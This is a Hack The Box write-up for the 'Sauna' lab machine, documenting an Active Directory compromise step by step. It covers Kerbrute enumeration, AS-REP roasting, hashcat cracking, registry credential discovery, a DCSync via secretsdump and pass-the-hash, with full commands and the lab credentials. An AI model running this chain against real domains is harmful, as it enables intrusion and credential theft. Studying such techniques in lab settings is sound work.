# Sauna - Hack The Box

## Summary

Sauna is an Active Directory machine that demonstrates several common AD attack techniques including user enumeration, AS-REP Roasting, credential discovery, Active Directory privilege analysis, and DCSync attacks. Initial access was obtained through AS-REP Roasting a valid domain user. Further enumeration revealed AutoAdminLogon credentials stored in the registry, leading to an account with DCSync privileges. These privileges were abused to dump domain password hashes and gain administrative access.

---

# Reconnaissance

## Nmap Scan

```bash
nmap -sC -sV -Pn 10.10.x.x
```

### Results

```text
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP
636/tcp  open  tcpwrapped
3268/tcp open  ldap
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0
```

The scan identified the target as a Domain Controller for the domain:

```text
EGOTISTICAL-BANK.LOCAL
```

---

# User Enumeration

Browsing the web application on port 80 revealed an "About" page containing employee names.

These names were converted into several username formats and stored in a wordlist.

Example formats:

```text
firstname.lastname
flastname
firstname
lastname
```

Kerberos user enumeration was performed using Kerbrute:

```bash
kerbrute userenum -d EGOTISTICAL-BANK.LOCAL \
--dc 10.10.x.x usernames.txt
```

A valid username was identified:

```text
fsmith
```

---

# AS-REP Roasting

The discovered user did not require Kerberos pre-authentication, making it vulnerable to AS-REP Roasting.

```bash
python3 /opt/impacket/examples/GetNPUsers.py \
EGOTISTICAL-BANK.LOCAL/fsmith \
-dc-ip 10.10.x.x
```

A Kerberos AS-REP hash was obtained and saved.

The hash was cracked using Hashcat:

```bash
hashcat -m 18200 TGT.txt wordlist.txt
```

Recovered credentials:

```text
Username: fsmith
Password: Thestrokes23
```

---

# Initial Access

WinRM access was available on port 5985.

Using the recovered credentials:

```bash
evil-winrm -i 10.10.x.x \
-u fsmith \
-p Thestrokes23
```

A shell was obtained as:

```text
EGOTISTICAL-BANK\fsmith
```

---

# Privilege Escalation

## AutoAdminLogon Credentials

Registry enumeration revealed stored AutoAdminLogon credentials.

```powershell
Get-ItemProperty -Path \
"HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" |
Select-Object AutoAdminLogon,DefaultUserName,
DefaultPassword,DefaultDomainName,AltDefaultUserName
```

Credentials discovered:

```text
Username: svc_loanmgr
Password: Moneymakestheworldgoround!
```

---

## DCSync Rights

Analysis showed that the service account possessed replication privileges:

```text
DS-Replication-Get-Changes
DS-Replication-Get-Changes-All
```

These permissions are sufficient to perform a DCSync attack.

---

# DCSync Attack

Using the service account credentials, password hashes were extracted directly from Active Directory.

```bash
impacket-secretsdump \
EGOTISTICAL-BANK.LOCAL/svc_loanmgr:'Moneymakestheworldgoround!'@10.10.x.x
```

The dump returned the NTLM hash for the domain Administrator account.

Example:

```text
Administrator:500:<LMHASH>:823452073d75b9d1cf70ebdf86c7f98e
```

---

# Administrator Access

Pass-the-Hash authentication was used to obtain administrative access.

```bash
evil-winrm -i 10.10.x.x \
-u Administrator \
-H 823452073d75b9d1cf70ebdf86c7f98e
```

Administrative privileges were successfully obtained.

---

# Attack Path

```text
Web Enumeration
      ↓
Employee Names
      ↓
Kerberos User Enumeration
      ↓
Valid User (fsmith)
      ↓
AS-REP Roasting
      ↓
Credential Recovery
      ↓
WinRM Access
      ↓
Registry Enumeration
      ↓
AutoAdminLogon Credentials
      ↓
Service Account Access
      ↓
DCSync Privileges
      ↓
Secretsdump
      ↓
Administrator Hash
      ↓
Pass-the-Hash
      ↓
Domain Administrator
```

# Key Techniques

* Kerberos User Enumeration
* AS-REP Roasting
* Password Cracking
* WinRM Access
* Registry Credential Discovery
* Active Directory Privilege Enumeration
* DCSync Attack
* Pass-the-Hash Authentication
